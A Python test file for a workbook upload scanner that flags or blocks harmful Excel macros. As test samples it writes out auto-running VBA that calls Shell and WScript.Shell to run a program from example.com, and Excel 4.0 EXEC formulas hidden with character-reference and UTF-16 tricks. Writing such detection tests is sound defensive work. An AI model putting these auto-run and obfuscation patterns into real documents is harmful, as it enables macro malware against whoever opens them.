import json
import subprocess
from unittest.mock import patch

import pytest

from lcfs.services.file_inspection import (
    FileRejectedException,
    analyze_workbook_macros,
    detect_file_type,
    inspect_upload,
)
from lcfs.services.file_inspection import macros
from lcfs.services.file_inspection.common import DAMAGED_MESSAGE, XLSM
from lcfs.tests.services.file_inspection.builders import (
    rewrite_zip,
    sample_vba_project,
    xlsm_bytes,
)
from lcfs.utils.constants import (
    ALLOWED_FILE_TYPES,
    ALLOWED_MIME_TYPES,
    MACRO_ENABLED_MIME_TYPES,
)

CI_TYPES = ALLOWED_MIME_TYPES + MACRO_ENABLED_MIME_TYPES

CLEAN_PROBE = {
    "modules": 2,
    "keywords": [],
    "autoexec": 0,
    "iocs": 0,
    "encoded_strings": 0,
    "stomping": False,
    "writes_files": False,
    "runs_programs": False,
    "references_projects": False,
}


def analyze(data):
    return analyze_workbook_macros(data, detect_file_type(data, "model.xlsm"))


def test_macro_workbook_passes_inspection_when_allowed():
    data = xlsm_bytes(sample_vba_project())

    detected = inspect_upload(
        data, "model.xlsm", CI_TYPES, ALLOWED_FILE_TYPES, MACRO_ENABLED_MIME_TYPES
    )

    assert detected.mime_type == XLSM
    assert detected.has_macros
    assert detected.vba_parts == ("xl/vbaProject.bin",)


def test_macro_workbook_is_refused_where_macros_are_not_allowed():
    with pytest.raises(FileRejectedException) as exc_info:
        inspect_upload(
            xlsm_bytes(sample_vba_project()),
            "model.xlsm",
            CI_TYPES,
            ALLOWED_FILE_TYPES,
        )
    assert "contains macros" in exc_info.value.detail


def test_real_vba_project_is_analyzed_in_a_subprocess():
    """Runs the actual oletools probe on a harmless sample project."""
    report = analyze(xlsm_bytes(sample_vba_project()))

    assert report.block_reason is None
    assert report.findings[0] == "Contains macros (1 code module)"
    assert "Runs automatically when the file is opened" not in report.findings
    assert macros.NOT_ANALYZED_FINDING not in report.findings


@pytest.mark.parametrize(
    "probe, finding",
    [
        ({"autoexec": 1}, "Runs automatically when the file is opened"),
        ({"runs_programs": True}, "Can run other programs or commands"),
        ({"writes_files": True}, "Can create or change files on the computer"),
        ({"iocs": 3}, "Contains web addresses, IP addresses or file names"),
        (
            {"encoded_strings": 4},
            "Contains encoded text that can hide what the code does",
        ),
        (
            {
                "keywords": [
                    {"type": "Suspicious", "keyword": "Shell"},
                    {"type": "Suspicious", "keyword": "CreateObject"},
                    {"type": "Suspicious", "keyword": "Hex Strings"},
                    {"type": "AutoExec", "keyword": "Workbook_Open"},
                ]
            },
            "Uses functions often found in harmful macros: CreateObject, Shell",
        ),
        (
            {"stomping": None},
            "The compiled macro code couldn't be checked against its source",
        ),
    ],
)
def test_findings_describe_what_the_macros_can_do(probe, finding):
    with patch.object(macros, "_probe", return_value={**CLEAN_PROBE, **probe}):
        report = analyze(xlsm_bytes(sample_vba_project()))

    assert report.block_reason is None
    assert finding in report.findings


@pytest.mark.parametrize(
    "probe, message",
    [
        ({"stomping": True}, macros.STOMPED_MESSAGE),
        ({"references_projects": True}, macros.PROJECT_REFERENCE_MESSAGE),
    ],
)
def test_clear_attack_signs_block_the_file(probe, message):
    with patch.object(macros, "_probe", return_value={**CLEAN_PROBE, **probe}):
        report = analyze(xlsm_bytes(sample_vba_project()))

    assert report.block_reason == message


def _macro_sheet(formula: str, encoding: str = "utf-8") -> bytes:
    return (
        f'<?xml version="1.0" encoding="{encoding}"?>'
        '<xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
        'xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">'
        f'<sheetData><row r="1"><c r="A1"><f>{formula}</f></c></row></sheetData>'
        "</xm:macrosheet>"
    ).encode(encoding)


def _macro_sheet_workbook(sheet: bytes) -> bytes:
    data = xlsm_bytes(extra={"xl/macrosheets/sheet1.xml": lambda _: sheet})
    # Declare the macro sheet's content type so it is found by type
    return rewrite_zip(
        data,
        {
            "[Content_Types].xml": lambda c: c.replace(
                b"</Types>",
                b'<Override PartName="/xl/macrosheets/sheet1.xml" '
                b'ContentType="application/vnd.ms-excel.macrosheet+xml"/></Types>',
            )
        },
    )


@pytest.mark.parametrize(
    "sheet",
    [
        _macro_sheet('EXEC("calc.exe")'),
        # Excel decodes character references before it reads the formula
        _macro_sheet('&#69;XEC("calc.exe")'),
        _macro_sheet('&#x45;&#x58;&#x45;&#x43;("calc.exe")'),
        _macro_sheet('EXEC("calc.exe")', encoding="utf-16"),
    ],
    ids=["literal", "decimal-reference", "hex-reference", "utf-16"],
)
def test_excel4_macro_that_runs_programs_is_blocked(sheet):
    report = analyze(_macro_sheet_workbook(sheet))
    assert report.block_reason == macros.XLM_EXEC_MESSAGE


def test_other_excel4_macros_are_flagged_for_review():
    report = analyze(_macro_sheet_workbook(_macro_sheet("SUM(A1:A3)")))
    assert report.block_reason is None
    assert "Contains Excel 4.0 macro sheets" in report.findings


@pytest.mark.parametrize(
    "sheet",
    [
        b"<macrosheet><f>EXEC(</macrosheet>",
        # Entities are refused rather than expanded
        b'<!DOCTYPE m [<!ENTITY e "EXEC">]><macrosheet><f>&e;("calc")</f></macrosheet>',
    ],
    ids=["malformed", "entity"],
)
def test_unreadable_macro_sheet_is_refused(sheet):
    report = analyze(_macro_sheet_workbook(sheet))
    assert report.block_reason == DAMAGED_MESSAGE


def test_oversized_macro_part_is_refused_before_it_is_read(monkeypatch):
    vba_project = sample_vba_project()
    monkeypatch.setattr(macros, "MAX_MACRO_PART_BYTES", len(vba_project) - 1)

    with (
        patch.object(macros, "read_part") as read_part,
        patch.object(macros, "_probe") as probe,
    ):
        report = analyze(xlsm_bytes(vba_project))

    assert report.block_reason == macros.TOO_LARGE_MESSAGE
    read_part.assert_not_called()
    probe.assert_not_called()


def test_macro_parts_over_the_total_limit_are_refused(monkeypatch):
    vba_project = sample_vba_project()
    monkeypatch.setattr(macros, "MAX_MACRO_TOTAL_BYTES", 2 * len(vba_project) - 1)

    report = analyze(
        xlsm_bytes(vba_project, extra={"xl/second.bin": lambda _: vba_project})
    )

    assert report.block_reason == macros.TOO_LARGE_MESSAGE


def test_vba_projects_share_one_time_budget(monkeypatch):
    """Each probe gets what is left of the budget, not a fresh timeout."""
    now = 0.0
    timeouts = []

    def slow_probe(args, *, timeout, **kwargs):
        nonlocal now
        timeouts.append(timeout)
        now += 60
        return subprocess.CompletedProcess(args, 0, json.dumps(CLEAN_PROBE).encode())

    monkeypatch.setattr(macros, "monotonic", lambda: now)
    monkeypatch.setattr(macros.subprocess, "run", slow_probe)
    vba_project = sample_vba_project()

    report = analyze(
        xlsm_bytes(
            vba_project,
            extra={
                "xl/second.bin": lambda _: vba_project,
                "xl/third.bin": lambda _: vba_project,
            },
        )
    )

    assert timeouts == [macros.PROBE_TIMEOUT_SECONDS, macros.PROBE_TIMEOUT_SECONDS - 60]
    assert macros.NOT_ANALYZED_FINDING in report.findings


def test_unreadable_vba_project_is_flagged_not_trusted():
    report = analyze(xlsm_bytes(b"not an OLE file"))
    assert report.block_reason is None
    assert macros.NOT_ANALYZED_FINDING in report.findings


def test_probe_timeout_is_flagged_not_trusted(monkeypatch):
    monkeypatch.setattr(macros, "PROBE_TIMEOUT_SECONDS", 0.001)
    report = analyze(xlsm_bytes(sample_vba_project()))
    assert macros.NOT_ANALYZED_FINDING in report.findings


class FakeParser:
    """Stands in for olevba's VBA_Parser so the probe's scanning can be tested."""

    code = ""

    def __init__(self, path, relaxed=False):
        self.ole_file = None
        self.ole_subfiles = []

    def extract_macros(self):
        yield "x", "VBA/ThisWorkbook", "ThisWorkbook.cls", self.code

    def detect_vba_stomping(self):
        return False

    def close(self):
        pass


def _probe_code(monkeypatch, code):
    import oletools.olevba

    from lcfs.services.file_inspection import vba_probe

    FakeParser.code = code
    monkeypatch.setattr(oletools.olevba, "VBA_Parser", FakeParser)
    return vba_probe.analyze("unused.bin")


def test_probe_ignores_attribute_lines(monkeypatch):
    report = _probe_code(
        monkeypatch,
        'Attribute VB_Name = "ThisWorkbook"\n'
        'Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"\n',
    )
    assert report["modules"] == 0
    assert report["encoded_strings"] == 0
    assert report["keywords"] == []


def test_probe_reports_what_hostile_code_does(monkeypatch):
    report = _probe_code(
        monkeypatch,
        "Sub Workbook_Open()\n"
        '  Shell "cmd /c calc"\n'
        '  Open "C:\\temp\\x.bat" For Output As #1\n'
        '  CreateObject("WScript.Shell").Run "http://example.com/x.exe"\n'
        "End Sub\n",
    )
    assert report["modules"] == 1
    assert report["autoexec"] >= 1
    assert report["iocs"] >= 1
    assert report["runs_programs"] and report["writes_files"]
    assert {"keyword": "Shell", "type": "Suspicious"} in report["keywords"]
